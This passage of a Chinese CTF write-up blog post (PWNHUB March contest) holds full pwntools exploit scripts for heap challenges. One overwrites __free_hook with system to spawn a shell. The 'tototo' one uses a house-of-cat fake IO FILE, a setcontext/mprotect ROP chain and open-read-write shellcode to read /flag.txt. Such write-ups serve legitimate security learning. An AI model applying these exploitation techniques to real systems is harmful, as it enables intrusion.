class="string">b&#x27;\x07&#x27;</span>)</span><br><span class="line">        dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        dele(<span class="number">4</span>)</span><br><span class="line">        edit(<span class="number">1</span>, <span class="string">b&#x27;\xc0\x10&#x27;</span>)</span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">b&#x27;\xa0\x14&#x27;</span>)</span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">10</span>, <span class="number">0x70</span>, <span class="string">b&#x27;\xa0\x46&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        dele(<span class="number">5</span>)</span><br><span class="line">        dele(<span class="number">6</span>)</span><br><span class="line">        edit(<span class="number">1</span>, <span class="string">b&#x27;\xc0\x10&#x27;</span>)</span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">b&#x27;\xa0\x14&#x27;</span>)</span><br><span class="line">        add(<span class="number">11</span>, <span class="number">0x70</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        add(<span class="number">12</span>, <span class="number">0x70</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x08&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        libcbase = uu64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[<span class="number">1</span>:])-<span class="number">0x1eb980</span></span><br><span class="line">        lg(<span class="string">&quot;libcbase&quot;</span>, libcbase)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        free_hook = libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">        system = libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        lg(<span class="string">&quot;free_hook&quot;</span>, free_hook)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        dele(<span class="number">7</span>)</span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        edit(<span class="number">1</span>, <span class="string">b&#x27;\xc0\x10&#x27;</span>)</span><br><span class="line">        edit(<span class="number">0</span>, p64(free_hook))</span><br><span class="line">        add(<span class="number">13</span>, <span class="number">0x70</span>, p64(system))</span><br><span class="line">        dele(<span class="number">11</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        p.interactive()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h2><p>限制了三次edit机会，申请只能申请较大的堆块，开了沙箱，ban了free_hook，也没怎么想了，直接打的house of cat，懒人实锤了: ( ，或者可以去泄露environ打栈也行</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;121.40.89.206&#x27;</span>,<span class="number">36789</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./tototo&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">&quot;is:&quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which one?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, cont</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which one?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;new content?\n&quot;</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Which one?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x510</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase = uu64(ru(<span class="string">&quot;\n&quot;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">lg(<span class="string">&quot;libcbase&quot;</span>,libcbase)</span><br><span class="line">IO_list = libcbase+<span class="number">0x1ec5a0</span></span><br><span class="line">wfile_jumps = libcbase+<span class="number">0x1ecf60</span></span><br><span class="line">lg(<span class="string">&quot;wfile_jumps&quot;</span>,wfile_jumps)</span><br><span class="line">setcontext = libcbase+<span class="number">0x580DD</span></span><br><span class="line">pop_rdi = libcbase+<span class="number">0x26b72</span></span><br><span class="line">pop_rdx_r12 = libcbase+<span class="number">0x11c371</span></span><br><span class="line">pop_rsi = libcbase+<span class="number">0x27529</span></span><br><span class="line">ret = libcbase+<span class="number">0x25679</span></span><br><span class="line">mprotect = libcbase+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x540</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x540</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = uu64(ru(<span class="string">&quot;\n&quot;</span>))-<span class="number">0xce0</span></span><br><span class="line">lg(<span class="string">&quot;heap_addr&quot;</span>, heap_addr)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x540</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+p64(<span class="number">0</span>)+p64(IO_list-<span class="number">0x20</span>))</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x540</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi)+p64((heap_addr&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(heap_addr+<span class="number">0x2b0</span>+<span class="number">0x58</span>)</span><br><span class="line">orw+=asm(shellcraft.openat(<span class="number">0</span>,<span class="string">&#x27;/flag.txt&#x27;</span>)+shellcraft.read(<span class="number">3</span>,heap_addr+<span class="number">0x1000</span>,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,heap_addr+<span class="number">0x1000</span>,<span class="number">0x100</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+p64(heap_addr+<span class="number">0x2b0</span>+<span class="number">0x10</span>)+p64(ret)+orw</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;heap0addr&quot;</span>, heap_addr-<span class="number">0xa0</span>+<span class="number">0x2b0</span>)</span><br><span class="line">fake_io_addr = heap_addr+<span class="number">0xce0</span></span><br><span class="line">lg(<span class="string">&quot;fake_io_addr&quot;</span>,fake_io_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_io = p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">fake_io += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)</span><br><span class="line">fake_io += p64(heap_addr-<span class="number">0xa0</span>+<span class="number">0x2b0</span>)</span><br><span class="line">fake_io += p64(setcontext)</span><br><span class="line">fake_io += pack(-<span class="number">1</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(heap_addr+<span class="number">0x5000</span>)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(fake_io_addr+<span class="number">0x30</span>)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(<span class="number">1</span>)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(wfile_jumps+<span class="number">0x30</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(fake_io_addr+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+fake_io[<span class="number">0x20</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：PWNHUB 3月赛</li>
+        <li>Post author：hash_hash</li>
+        <li>Create time：2023-03-14 13:27:06</li>
+        <li>
+            Post link：https://hash-hash.github.io/2023/03/14/PWNHUB-3月赛/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/wp/">#wp</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/01/15/Kernel-Pwn%E8%AE%B0%E5%BD%95/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">Kernel Pwn记录</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>Contents</strong></div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sh-v1-1"><span class="nav-text">sh_v1_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ttsc"><span class="nav-text">ttsc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#three-edit"><span class="nav-text">three_edit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tototo"><span class="nav-text">tototo</span></a></li></ol>
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;<i class="fa-solid fa-heart icon-animate"></i>&nbsp;<a href="/">hash_hash. All Rights Reserved.</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v0.4.4</a>
+        </div>
+        
+        
+        <script async data-pjax defer>
+            function odometer_init(){
+                    let el = document.getElementsByClassName('odometer');
+                    for (i = 0; i < el.length; i++) {
+                        od = new Odometer({
+                            el: el[i],
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    }
+            }
+            odometer_init();
+        </script>
+        <div id="start_time_div" style="display:none">
+            2022/8/17 11:45:14
+        </div>
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fa-solid fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fa-solid fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fa-solid fa-left-right"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fa-solid fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fa-solid fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fa-solid fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fa-solid fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/runtime.js"></script>
+
+    
+<script src="/js/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/css/odometer-theme-minimal.css">
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
